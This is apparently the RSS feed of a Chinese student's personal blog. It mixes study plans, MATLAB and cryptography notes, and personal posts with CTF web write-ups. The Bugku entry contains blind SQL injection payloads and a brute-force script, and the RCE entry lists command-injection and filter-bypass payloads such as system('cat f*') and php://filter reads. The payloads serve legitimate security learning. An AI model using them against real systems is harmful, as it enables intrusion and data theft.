<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Console.makeHappy(_1ming)</title>
    <link>https://shenyiming.life/</link>
    <description>Recent content on Console.makeHappy(_1ming)</description>
    <image>
      <url>https://shenyiming.life/android-chrome-512x512.png</url>
      <link>https://shenyiming.life/android-chrome-512x512.png</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 30 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://shenyiming.life/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>👨🏻‍🔧寒假学习计划</title>
      <link>https://shenyiming.life/post/%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</link>
      <pubDate>Thu, 20 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</guid>
      <description>Readme 这学期寒假开始于1月11日
1月14日回家 15日玩 16日玩 17日有所学习 18日玩 19日玩
20日：我要制定个计划 寒假还是要学习的
21日：玩
BLOG RESTART
主要任务   数学建模-编程手
 学习MATLAB 学习数学建模相关模型 算法实现 资料积累    CTF web方向与渗透
 刷CTF web题 学习python爬虫 学习kali linux    带crypto小组
  时间安排 2022年1月21日至2022年2月18日
高效率可能还是放在返校后
学习计划模板   序号 时间 任务 完成情况     1 9:00-11:30 学习MATLAB并整理笔记 [ ]   2 15:00-16:00 做CTF show题目 [ ]   3 16:00-17:00 整理笔记 [ ]   4 22:00-23:00 看《数学模型》 [ ]    事项  MATLAB跟视频学到绘图 看MATLAB 数学建模书，积累模型，多敲代码 熟悉MATLAB的绘图 数学模型 CTF-show xss类题目     序号 任务 日期 完成情况     1 重新配置ghpages 1月30日上午 完成   2 Crypto小组组会 1月30日20:30 完成   3 MATLAB数据结构与存储     4      5      6       </description>
    </item>
    
    <item>
      <title>密码学数学基础 Cryptology Mathematics</title>
      <link>https://shenyiming.life/cryptologymath/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/</guid>
      <description>密码学数学基础笔记整理</description>
    </item>
    
    <item>
      <title>离散数学 Discrete Mathematics</title>
      <link>https://shenyiming.life/discrete-mathematics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/discrete-mathematics/</guid>
      <description>数理逻辑部分笔记知识点整理</description>
    </item>
    
    <item>
      <title>友链</title>
      <link>https://shenyiming.life/friends/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/friends/</guid>
      <description>相位🚀Either outstanding or out.F.I.V.EFIGHTING!Air吾善养吾浩然气WingerBlogto think and to share</description>
    </item>
    
    <item>
      <title>关于</title>
      <link>https://shenyiming.life/about/</link>
      <pubDate>Fri, 09 Nov 2001 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/about/</guid>
      <description>申一鸣 Yiming Shen A crappy photographer, a terrible CTFer, a lazy geek.
A photography lover, a CTF learner, a geek spirit follower.
About My Blog  正经人谁写日记啊。
 我是正经人，我写。
现在的互联网上最不缺的就是内容发布平台，小到个人QQ空间、微信朋友圈，大到微博、贴吧、知乎、B站、小红书、GitHub、Ins，还有各种博客园、CSDN、简书，全方位覆盖了几乎所有分享需求，为什么还要选择这自己建一个站呢？
一是复古，一种互联网时代的仪式感
二是为了追求其有限公开性，小众的东西总往朋友圈发有装逼不合群之嫌，我不愿单纯做一个离群索居的极客。
三是利用对于博客维护过程中的沉没成本，倒逼我学习新知，养成记录笔记的习惯。
&amp;amp;nbsp
总而言之，欢迎光临~
&amp;amp;nbsp
&amp;amp;nbsp
&amp;amp;nbsp
Releases 28 Jan 2022 0.2.4
 【更新描述】
  开启unsafe模式，允许md文档中插入HTML代码   22 Jan 2022 0.2.3
 【更新描述】
  增加友链功能 增加文章封面 完成页面汉化 增加entry动画 调整了tags的termcss样式  未来计划：迁移至gitee或腾讯云
 【博客快照】
21 Jan 2022 0.</description>
    </item>
    
    <item>
      <title>Crypto方向的寒假计划</title>
      <link>https://shenyiming.life/post/crypto/</link>
      <pubDate>Sun, 30 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/crypto/</guid>
      <description>寒假计划……寒假已经过半的寒假计划
 Crypto 方向 - 密码学  密码学作为数学的延伸，主要应用于计算机类的信息科学，现在应用十分广泛，哪里需要信息的传递，哪里就需要密码学。学习密码学这种交叉信息学科对数学和计算机的要求都较高，二者缺一不可。
  经典（古典）密码学 现代密码学  CTF中的crypto类题目主要以现代密码学为主，现阶段熟练现代密码学的形式和解题套路即对于竞赛大有裨益。难题则反而更接近于古典密码学，类似奥数难题。古典密码但与现代密码只是目的一致而道路差异较大。
密码学应学习的内容/具备的素养  语言表达能力，多语言能力（包括程序语言） 逻辑思维 从具象到抽象的能力 主动学习，思维灵活 数学基础（代数），数学思维，对数学的应用能力 至少一门脚本语言（如Python） 基本熟悉各种类型的密码加密与解密 尽可能在学习时深入至原理，与4实现双循环。  仅剩的半个月我该做什么  种一棵树最好的时间是十年前，其次是现在。
 明确自己要学什么 寒假时间并不长，建议分以下几个方向单项推进或同时进行
数学  高等数学 线性代数 离散数学 初等数论 抽象代数
 不用害怕，反正这些你早晚都得学，与密码学息息相关的是后两者，初等数论较为简单（应用简单原理难），可作为休息项目进行学习，重点在于建立数学的逻辑思维和养成数学语言表达习惯。
提前学高数下和线代也行，虽然与我们小组没啥关系，或许你学好了下学期有更充裕的时间刷crypto题？（并不会）
编程  C C++ Java Python Ruby Perl……
 人生苦短，咱学Python
学一门语言的诀窍在于：多用
英语如此，程序语言也如此，一定要进行大量练习配合学习。
密码学  古典密码（略）公钥密码 分组密码 流密码 数字签名 图像加密 ……
 不是特别建议单纯推进这一方向，可以同时带上编程或者数学的学习。
推荐按照书籍《深入浅出密码学》的目录顺序进行了解学习并辅以类似ctf-crypto的题目进行练习
同时还可以检验自己编程学习成果，用自己学到的语言独立地完成加密解密算法编写。
勤记笔记！
列一张计划表    序号 时间 任务 完成情况     1 2月1日 9:30 赖床 √   2 2月1日 22:30 学习《深入浅出密码学》P18-32页并记笔记 ×    公开计划表* 无论是向全网公开，还是发到朋友圈QQ空间，还是告诉自己的父母朋友，有限度地公开既能装逼又能督促自己完成计划，父母从此再也不会说你在玩电脑了lmao</description>
    </item>
    
    <item>
      <title>Less-2 结构程序与自定函数</title>
      <link>https://shenyiming.life/post/less-2_scriptfunction/</link>
      <pubDate>Sun, 23 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/less-2_scriptfunction/</guid>
      <description>脚本模式 脚本模式用于编写结构化程序
示例
for i=1:10 x=linspace(0,10,100); plot(x,sin(x+i)); print(gcf,&amp;#39;-deps&amp;#39;,strcat(&amp;#39;plot&amp;#39;,num2str(i),&amp;#39;.ps&amp;#39;)); end 画0-10内sin图像
   F5 运行程序
  打断点可调试运行
  % 是注释
  选中 Ctrl + R 可批量注释
  选中 Ctrl + I 智能缩进
   自定函数  在某个函数文件中定义函数，在命令行窗口或脚本模式进行调用。
 单变量计算 $$ x = x_0 +v_0t +\frac{1}{2}gt^2 $$
function x =freebody(x0,v0,t) x = x0 + v0 .*t + 1/2*9.8*t.*t % 采用点乘 可以以矩阵形式同时计算多组变量 多变量计算 $$ a = \frac{v_2-v_1}{t_2-t_1} \newline F=ma $$</description>
    </item>
    
    <item>
      <title>积重难返</title>
      <link>https://shenyiming.life/post/%E8%A3%85%E6%9C%BA%E5%90%A7/</link>
      <pubDate>Sun, 23 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/%E8%A3%85%E6%9C%BA%E5%90%A7/</guid>
      <description>更换机箱-更换电脑 上图是我组装过的第六台电脑，是一台ITX，也是真正属于我的第一台电脑。
这是一个空间利用率极高的A4机箱，对于2020年浮躁的我来说，能塞好点亮，就是任务完成，并未作长远考虑，这对于后来一年两次往返2000km+的两地的我和以性价比高为特点的配件来说，都是灾难。
长期的颠簸导致一开始错误固定的显卡、电源、主板出现了一定的问题，具体请参考有关细节
在2022年的寒假，终于忍受不了的我选择打翻重来，换掉机箱，重新组装。
新机箱先马趣造I&amp;rsquo;m 其实是一个MATX机箱，经过我并不严格的参数比对后认为，新机箱仍能放进行李箱里，便舍弃了itx方案，将配件拆下后放进了如下图所示的新机箱，盖上玻璃侧板后，颜值比照片高很多，可惜由于是itx主板加sfx电源，有大量空间被浪费，失去了原先酷鱼G5 Plus 满满当当分量十足的感觉。
旧机箱挂在闲鱼上一个小时便成功卖出，应该是带了显卡延长线卖的又十分便宜的原因，想不到今年装机市场还是如此景气。
 装好后好景不长，又双叒叕碰上了正常开机无显示信号的问题，经排查发现是显卡接触不良造成，正是过去错误安装加上长途运输时未拔显卡导致pcb板变形，两侧受力不均造成，积重难返！
随后拆机，松显卡固定螺丝并给显卡电源线绑了个扎线带，提供一个向下侧拉扯的力，一时半会能正常使用，但并非是一个长久之计，若非显卡价格严重虚高，可能已经出了换张亮机卡了，早已过了爱折腾的时候，只祈求稳定能用。</description>
    </item>
    
    <item>
      <title>Less-1 MATLAB基本操作与矩阵输入</title>
      <link>https://shenyiming.life/post/less-1_matlab%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Sat, 15 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/less-1_matlab%E5%9F%BA%E7%A1%80/</guid>
      <description>基本操作 命令行模式
公式输入 直接输入算式即可计算结果
输入格式基本同自然语言
计算： $$ cos(\sqrt{(\frac{1+2+3+4}{5})}) $$
cos(sqrt((1+2+3+4)/5)) 注意：5/2 是5除以2 5\2是2除以5
变量定义 定义变量与python相同，无需声明，默认类型为double
不能声明为变量的系统关键字：显示格式
format long 格式种类：
clc #清屏 clear a #删除变量a who #查询变量 whos #查询变量详细信息 矩阵输入 矩阵定义 a = [1 2 3 4] #定义1*4矩阵 b = [1;2;3;4] #定义4*1矩阵 a = [1 2 3 4;1 2 3 4;1 2 3 4;1 2 3 4] #定义4*4矩阵 矩阵索引 取/修改某个值 a(8) #取第8个值（按行从上往下数）a(8)=4 a([1 3 5])#取第1 3 5个值 a([1 3;1 3])#取第1个数和第3个数 两遍 a(3,2) #取第三行第二列的数 a([1 2],[2 3])#取第1行第2行和第2列第3列的交集为一个新矩阵 k = [k,10] k(end+1) = 10; k = [k(1:5),5.</description>
    </item>
    
    <item>
      <title>我的2021</title>
      <link>https://shenyiming.life/post/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
      <pubDate>Fri, 31 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
      <description>刚刚感慨万分的敲上了 2021-12-31，以后再少有打2021的机会了，这一年还有七分钟就结束了。
从若干年前我就开始伤春悲秋了，写年终总结却时断时续，当时觉得总结纯属抒发情感矫揉造作，现在回想再看真是意义非凡。
今年算较为成功的一年了，和2020年的颓废相比，春节后算是一帆风顺，军训开始迅速减了肥，从宝岛新村 跑去了海口，熟练了蛙泳，爱上了游泳，趁着疫情几近销声匿迹，去了广州，青岛，重庆，厦门，文昌，珠海，深圳；见了哥们，泡了妹妹，看过火箭，找了对象，打过比赛，有了工位，领了工资，有了目标与方向，摄影水平突飞猛进，年末搞搞学习，累过，爱过，热烈过，坦然过，内卷过，躺平过，一无所成过，手无足措过，心满意足了。
2022年，加油！</description>
    </item>
    
    <item>
      <title>早起可能是有意义的</title>
      <link>https://shenyiming.life/post/%E6%97%A9%E8%B5%B7%E7%9A%84%E6%84%8F%E4%B9%89/</link>
      <pubDate>Mon, 27 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/%E6%97%A9%E8%B5%B7%E7%9A%84%E6%84%8F%E4%B9%89/</guid>
      <description>到期末复习周了，天天自由自在9:00以后起床，想睡多久睡多久，终于摆脱了沙雕的一天只有一节课，一节7:40起床的架构型排课了……
但随着每天晚起，发现中午到点睡不着，睡不好，虽然我告诉自己在床上闭眼呼吸就算睡着，可下午身体还是不听指挥，头昏脑涨，全然没有一觉睡醒后的改天换地之感……
看来啊，想要保持高效率的一天，早起一点还是有必要的，这个早起未必是起多早，总而言之不能是自然醒。</description>
    </item>
    
    <item>
      <title>超脱 Detachment</title>
      <link>https://shenyiming.life/post/%E8%B6%85%E8%84%B1-detachment/</link>
      <pubDate>Fri, 24 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/%E8%B6%85%E8%84%B1-detachment/</guid>
      <description> 要无心太容易了，在乎才需要勇气。
It&amp;rsquo;s so easy to be careless. It takes courage to take care.
 最近几天断断续续地，基本看完了电影超脱 Detachment
 有人觉得我们能改变一些事情，有时当我们醒来，才知道我们也力不能及。
 </description>
    </item>
    
    <item>
      <title>坏事成吨</title>
      <link>https://shenyiming.life/post/%E5%9D%8F%E4%BA%8B%E6%88%90%E5%90%A8/</link>
      <pubDate>Thu, 23 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/%E5%9D%8F%E4%BA%8B%E6%88%90%E5%90%A8/</guid>
      <description>早上早八时圆通给我发了取件码，下了课9:30我就先把车找了个充电桩充上电，去拿快递，到了跟我说没到点，十点才能拿。。那你取件码发的倒他妈很勤啊，十点能拿你九点发什么取件码。刚走没两步收到消息说之前干的采集考研考生信息的工资到账了，我一查，果然没有，又屁颠屁颠跑去行政楼要钱，走到一半，转头一想，运气这么差，不会丫的充电头也让人拔了吧……一低头，我去
去你妈的，真几把会拔，五个都是绿灯就我一个红灯你拔我的？敢情这是碰上红绿色盲了？
咱也不是啥有素质的人，转头就走回去给他拔了，呵呵，正好是第三节上课的点，白停一上午，叫你丫眼瞎。
好事是不是成双来我不清楚，坏事确实会抱团来搞你。</description>
    </item>
    
    <item>
      <title>有关细节✒️</title>
      <link>https://shenyiming.life/post/%E6%9C%89%E5%85%B3%E7%BB%86%E8%8A%82/</link>
      <pubDate>Mon, 20 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/%E6%9C%89%E5%85%B3%E7%BB%86%E8%8A%82/</guid>
      <description>昨天晚上罕见的早睡，在床上困意十足地同生物钟作斗争时，不幸的想起了纠结的一些事情：要不要给台式机换个机箱？继续换itx A4机箱，还是换一个开放式机箱？再换itx有必要吗？换开放式机箱能装好/带走吗？……诸如此类。
我现在的台式机有点问题，若受到颠簸后会电平不稳，开机不亮屏，反复自启至无法开机，放置至少一天半天后才可恢复，这种问题如此奇葩以至于网上甚至少有相关问题。或许是它不适应海南潮湿的天气，或许是全铝合金的机箱接地漏电，当然，更或许是我当初装机时少拧了一个位置妖娆的电源螺丝……即使后来痛苦地补上了，但是损害已经造成，长期的漏电导致我本就不靠谱的RX580 2048sp显卡和450w sfx电源产生了或多或少的损害，现在的电脑之于我已经是一尊大爷，每次只能请他帮我一点微不足道的小忙。
睡前也是一段贤者时间，我再一次开始反省自己的过往。2020年暑假，我帮一位同学组装他的新电脑时（我只是在旁边起一个Readme.md的作用）主板某处螺丝孔位不对，我和他起了一点争执，我以我多年装机经验认为把有洞的螺丝拧上起个固定作用即可，没有必要全部拧上，他则认为应当精益求精，注重细节，坚持把主板拆下来重新布局铜柱。当然，他是对的，我多年的、不注重细节的装机经验，只是现在在我入睡前折磨着我。
不仅仅如此。
20年也是我高考的日子，一直让我耿耿于怀的30分，让我从末流985到末流211的30分。我现在可以以过来人的身份说高考不那么重要，未来还他妈有很多很多的机会……是啊，可是这个机会失去了，那个疫情在家期间每天拼命学习，模拟考真的弯道超车的我的努力付诸东流了，这和我磕磕绊绊的电脑一样，也是因为没有细节。
一年过去了，当我的女朋友告诉我她是因为我对细节的注重才注意到我时，我却觉得是莫大的讽刺。那也许只是我对细枝末节强迫症般的追求和蹩脚的脑细胞进程调度产生的错觉，我并没有真正做到注重细节，骨子里还是一个粗心大意丢三落四的人。
这篇文章似乎并不该被我传到博客里，写完才发现这些其实应该是我日记里写的东西……
是啊，我还有个日记本，插在我的书架里。</description>
    </item>
    
    <item>
      <title>2021-2022-1 期末复习计划</title>
      <link>https://shenyiming.life/post/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92/</link>
      <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92/</guid>
      <description>Readme 感觉用了大量的时间做计划……好吧，既然是持续近1月的“政策”，花一天时间来拟定也无妨，本文处于随时更新状态。
这学期最难学分最高的课程已经考完，剩余课程比较平均，权重大致相同，没有重点，全是重点。
优点是有一整周的无课复习时间，考试时间间距也比较大，并无特别困难的科目，复习资料均充足，总而言之希望能取得好成绩。
期末考试时间    序号 课程名称 考试时间 学分     1 数字逻辑电路与系统设计 2022-01-04 09:00~10:40 3   2 马克思主义基本原理 2022-01-05 08:00~09:00 3   3 离散数学 2022-01-05 15:20~17:00 3   4 国际交流英语III 2022-01-07 09:00~10:40 2   5 大学物理B(下) 2022-01-07 15:20~17:00 3   6 概率统计A1 2022-01-11 15:20~17:00 3    复习时间 17周12月20日-12月26日课程极少，几乎可忽略不计。18周12月27日-1月3日有8天无课，19周周二考试，20周周二考完最后一门，其中1月8日-1月10日3天无考试。
时间极充裕。
复习计划 各科复习内容 数字逻辑电路与系统设计  课后练习题 往年期末题 利用proteus进行组合逻辑/时序逻辑电路设计  马克思主义基本原理（机考）  背，就硬背 攒复习资料，各种机考试题 找方法 看题库，酌情背课后习题  离散数学  课后习题  国际交流英语  看大学生学术英语课本  大学物理  重新打印习题册 重点练习电磁学部分习题  概率统计  课后习题 期末考试题  一轮复习计划表（12月15-12月26） 目标：完成四科概览</description>
    </item>
    
    <item>
      <title>密码学数学基础-大纲</title>
      <link>https://shenyiming.life/cryptologymath/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-%E5%A4%A7%E7%BA%B2/</link>
      <pubDate>Sun, 12 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-%E5%A4%A7%E7%BA%B2/</guid>
      <description>数论 整除 带余除法 最小公倍数与最大公约数 计算()和[] 欧几里得算法 同余 模逆 模逆的计算（扩展欧几里得算法） 同余的各种性质与运算（加乘指数） Wilson定理 $$设p为素数，则(p-1)!\equiv -1(mod\quad p)$$
同余类、既约同余类 剩余系、完全剩余系、既约剩余系 欧拉函数 欧拉定理 费马小定理 费马素性检测算法 米勒罗宾素性检测算法 同余方程 同余方程是否有解判定与解的个数计算 二元一次不定方程 单一解的一次同余方程的两种解法 快速模指数运算 解一次同余方程组——中国剩余定理 基于中国剩余定理的秘密共享 高次同余 二次剩余 $$ x^2\equiv a(mod\quad p) $$
有解则称a是模p的二次剩余
欧拉判别法 $$ a^{\frac{p-1}{2}}\equiv 1(mod\quad p) 是二次剩余\\ a^{\frac{p-1}{2}}\equiv -1(mod\quad p) 是二次非剩余\\ $$
勒让德符号与雅可比符号 高斯引理 二次互反律计算勒让德符号 原根 阶及其计算 原根的计算 已知一个原根 求其余阶和原根 离散对数 代数 群 群满足的4条性质 Abel群 半群 含幺半群 有限群 无限群 置换群 对称群 置换群与对称群 子群 商群 循环群 子群判定定理 知1求2</description>
    </item>
    
    <item>
      <title>Public Key Cryptology</title>
      <link>https://shenyiming.life/post/public-key-cryptography/</link>
      <pubDate>Tue, 09 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/public-key-cryptography/</guid>
      <description>CONTEXT ​	The first general purpose computers were built in the 1940s. They were large, filling big rooms, using hundreds of valves and consuming many kilowatts of electricity. Although they were considered amazing for the ability to execute thousands of instructions per second at that time, all these huge machines were rapidly became history and might have been lost in the mists of time. With the increasing speed of computing, networks of computers were established allowing people to have access to communicate with others in distant places.</description>
    </item>
    
    <item>
      <title>6 群环域</title>
      <link>https://shenyiming.life/cryptologymath/6.1_%E7%BE%A4/</link>
      <pubDate>Mon, 08 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/6.1_%E7%BE%A4/</guid>
      <description>半群 只满足封闭性和结合律
含幺半群 满足封闭性、结合律和单位元
  含幺半群G中的单位元e是唯一的 含幺半群G中任意可逆元a，其逆元是唯一的（可以没有逆元）   Abel群（交换群） 满足封闭性、结合律、单位元、逆元的同时，还满足交换律
有限群 无限群 元素个数
子群  设H为群G的一个非空子集，若H对G的运算&amp;quot;.&amp;ldquo;也构成群，则称H为群G的子群，记作H&amp;lt;=G
 $$ 在通常意义的加法运算下\\ Z\le Q $$
子群判定定理 知1求2
1证2 2证3 3证1
商群  定义6.3.1 陪集 陪集是一个集合
例6.3.1 模8加法群
定理6.3.1 陪集的性质 证明 陪集构成了群元素的一个类，互不相交，互不包含
定义6.3.2 H在G中的指数 子群H在群G中不同陪集的个数，称为H在G中的指数，记为[G:H]
定理6.3.2 拉格朗日定理 设H是有限群G的子群，则|G|=|H|·|G:H|
G中元素个数=子群H中元素个数*H在G中的不同陪集个数
定义6.3.3 正规子群 $$ 设G为群，H\le G,若对G中任一元素a均有aH=Ha，则称H为G的正规子群\\ 即为H\lhd G $$
当G为Abel群时，它的任意子群均为它的正规子群。
子群{e}/群G本身为它的两个平凡正规子群。
定理6.3.3 正规子群判定定理 $$ aHa^{-1}
$$
定义6.3.4 商群 $$ 上述定理中G/H关于子集的乘法构成的群 $$
例题6.3.5 $$ 模8加法群(Z_8,+)，H={0,2,4,6}为子群。 $$</description>
    </item>
    
    <item>
      <title>5 原根</title>
      <link>https://shenyiming.life/cryptologymath/5.1_%E5%8E%9F%E6%A0%B9%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8/</link>
      <pubDate>Sun, 24 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/cryptologymath/5.1_%E5%8E%9F%E6%A0%B9%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%80%A7%E8%B4%A8/</guid>
      <description>原根的基本概念与性质 定义  $$ 设m为正整数，(a,m)=1，使得a^d\equiv 1(mod\quad m)成立的\最小正整数d，称为a对模m的阶，记作ord_m(a) $$
 原根的计算 已知一个原根，算所有阶
例题 </description>
    </item>
    
    <item>
      <title>Bugku-SQL注入-WriteUP</title>
      <link>https://shenyiming.life/post/15.bugku-sql%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Sun, 24 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/15.bugku-sql%E6%B3%A8%E5%85%A5/</guid>
      <description>题目网址：sql注入
一个很正经的界面，有实战那味了。
上来先尝试经典组合：
admin~password
很幸运，用户名猜中了。
利用单引号检测是否存在SQL注入
admin&#39; or 1 = 1
报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：
&#39;or&amp;lt;&amp;gt;(不等号)#()空格可用括号代替，等号可用相反的不等号
先尝试是否存在布尔注入：
成功，用户名存在注入~
之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）
select password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload
1&amp;#39;or((ascii(mid((select(password)from(admin))from(1))))&amp;lt;&amp;gt;9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难
我们尝试下集束炸弹，让两个参数都作为目标
第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码
爆破成功了。。。
接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：
4dcc88f8f1bc05e7c2ad1a60288481a2
去md5破解站破解一下，成功解出密码：
bugkuctf
结束了……
反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。
贴一组大神的python自动脚本，以供学习
#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = &amp;#39;http://114.67.246.176:19665/&amp;#39; sss = string.digits + (string.ascii_lowercase) a = &amp;#39;&amp;#39; for i in range(1, 50): flag = 0 for j in sss: payload = &amp;#34;admin&amp;#39;^((ascii(mid((select(password)from(admin))from(%s))))&amp;lt;&amp;gt;%s)^1#&amp;#34; % (i, ord(j)) #屏蔽了&amp;#34;,&amp;#34;，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #&amp;lt;&amp;gt;表示不等号 #^表示异或 payload2= &amp;#34;admin123&amp;#39;or((ascii(mid((select(password)from(admin))from(%s))))&amp;lt;&amp;gt;%s)#&amp;#34;%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= &amp;#34;admin123&amp;#39;or((ascii(mid((select(database()))from(%s))))&amp;lt;&amp;gt;%s)#&amp;#34;%(i,ord(j)) data = {&amp;#39;username&amp;#39;: payload, &amp;#39;password&amp;#39;: &amp;#39;admin&amp;#39;} res = requests.</description>
    </item>
    
    <item>
      <title>CNSS Recruit-Web Write UP</title>
      <link>https://shenyiming.life/post/14.cnss-recruit-web-write-up/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/14.cnss-recruit-web-write-up/</guid>
      <description>前言 躺在床上，不想动鼠标，那就先写写前言吧。
这个CTF比赛是我打的第二场比较正规、完整的比赛。
惨不忍睹，当然，作为刚入门的noob来说也可以接受。
希望能通过笔记的整理消化新掌握的知识，道阻且长。
[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。
关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.
python2 .\GitHack.py http:\\x.x.x\.git 运行后即得到git目录。
Git版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。
git log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。
其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。
[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。
第一反应是绕过和注入咯，尝试后无果。
再观察续一秒按钮前端代码，发现是安慰剂按钮。。。
那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：
import requests import re # 正则表达式库 import string from requests.sessions import session url = &amp;#39;http://81.68.109.40:30005/&amp;#39; session = requests.</description>
    </item>
    
    <item>
      <title>RCE 远程命令执行漏洞</title>
      <link>https://shenyiming.life/post/13.rce%E4%B8%93%E6%A0%8F/</link>
      <pubDate>Wed, 20 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyiming.life/post/13.rce%E4%B8%93%E6%A0%8F/</guid>
      <description>本文以CTF-show Web入门29-41题作为例题，学习RCE相关知识。
Web 29 过滤了flag字样
?c=system(&amp;quot;cat f*&amp;quot;);Web 30 过滤了flag|system|php三个关键字，flag和php是待执行命令文本， 可以通过引号、斜杠或反斜杠绕过
echo `cat f\lag.ph\p`; 反引号可以执行系统命令
Web 31 在cat被禁时，我们还可以采用如下命令
 1.tac：从最后一行开始显示，是cat的反向显示 2.more：一页一页的显示档案内容 3.less：与more类似 4.head：查看文档的前几行 5.tail：查看文档的后几行 6.nl：显示的时候，顺便输入行号 7.od：以二进制的方式读取档案内容 8.vi：一种编辑器 9.uniq：查看 10.vim：一种编译器
 空格的代替符号：
 1.${IFS}2.$IFS$13.${IFS4.%205.&amp;lt;和&amp;lt;&amp;gt;重定向符6.%09 构造本题payload
?c=echo&amp;#39;more%09f*&amp;#39;;  其他题解：
?c=eval($_GET[1]);&amp;amp;1=system(&amp;#39;cat flag.php&amp;#39;);嵌套脱离了c的正则判断 ?c=echo`strings%09f*`; ?c=&amp;#34;\x73\x79\x73\x74\x65\x6d&amp;#34;(&amp;#34;nl%09fl[a]*&amp;#34;);等价于system()。这个学到了！  Web 32 屏蔽了echo
分号可以用?&amp;gt;代替，括号可以用“”绕过，利用文件包含的方式查看flag.php，注意要先进行base64转码以绕过关键词过滤。
?c=include&amp;#34;$_GET[1]&amp;#34;?&amp;gt;&amp;amp;1=php://filter/read=convert.base64- encode/resource=flag.php 绕过死亡EXIT - CNSS 太极掌门人 &amp;lt;?php $filename=$_GET[&amp;#39;filename&amp;#39;]; $content=$_GET[&amp;#39;content&amp;#39;]; file_put_contents($filename,&amp;#34;&amp;lt;?php exit();&amp;#34;.$content); 两个参数变量间用exit()方法隔开，即使注入一句话也无法执行，如何绕过这个“死亡exit”？
我们只需要将content前面部分内容使用某种手段(如编码)进行处理，导致PHP不能识别该部分即可。
